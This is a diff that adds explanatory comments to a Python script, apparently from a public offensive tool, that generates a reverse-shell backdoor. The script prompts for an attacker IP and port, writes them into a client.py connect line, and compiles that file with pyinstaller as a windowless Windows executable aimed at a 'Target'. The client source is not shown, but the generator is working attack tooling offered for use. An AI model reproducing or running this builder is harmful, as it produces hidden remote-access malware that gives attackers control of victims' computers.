@@ -3,7 +3,7 @@ import sys
 import time
 import subprocess
 from termcolor import colored
-
+#importing the required Libraries
 
 golo = '''
  _    __      _      __                                 __            
@@ -15,6 +15,7 @@ golo = '''
                                 *By SxNade https://github.com/SxNade
  '''
 
+#defining a start Function that runs the relevant Function
 def start():
     print(golo)
     time.sleep(2)
@@ -28,17 +29,20 @@ def aim():
     print(colored("[+]Starting Payload Genration Engine NOW....", 'green', attrs=['bold']))
     global reverse_ip
     global reverse_port
+    #making reverse IP and PORT global to use in other Function For editing the source code File...
     reverse_ip = input(colored("\n[+]Enter the LHOST(Reverse-shell-IP): ", 'red', attrs=['bold']))
     reverse_port = int(input(colored("[+]Enter the LPORT(Reverse-shell-PORT): ", 'red', attrs=['bold'])))
     print(f"[*]LHOST is {reverse_ip} and LPORT is {reverse_port}")
     time.sleep(3)
     print(colored("\n\n[!]IF Your Target Is Windows Please Run this Script On a Windows Machine....For compilation of windows executable....", 'red', attrs=['bold']))
     fire()
+    #Running the Fire Function which generates the Source code for Backdoor
 
 def fire():
     with open('client.py', 'r') as file:
         data = file.readlines()
     data[18] = f's.connect(("{reverse_ip}", {reverse_port}))\n'
+    #editing the source code...for specified reverse_shell IP and PORT
     with open('client.py', 'w') as file:
         file.writelines( data )
     time.sleep(3)
@@ -46,10 +50,12 @@ def fire():
     time.sleep(3)
     command = 'pyinstaller.exe client.py --onefile --noconsole'
     subprocess.call(command, shell = True)
+    #Compling the Payload
     print(colored("\n\n[+]Payload Genration Successfull", 'green', attrs=['bold']))
     print(colored("[*]Check the dist directory in C--<users>--<your-username>--<dist> ", 'red', attrs=['bold']))
 
 def main():
+ #main Function that Runs the whole Program and also querys user IF they are Familiar with the commands in reverse_shell
     ask = input(colored("[?]Are you familiar with command and control of Reverse-shell(Y/N): ", 'green'))
     if ask == 'Y':
         start()
@@ -73,4 +79,5 @@ def main():
         print(colored("[!]UNEXPECTED INPUT......exiting now...", 'red', attrs=['bold']))
         sys.exit(0)
 
+#Finally Caling the main Function To Run the Program
 main()
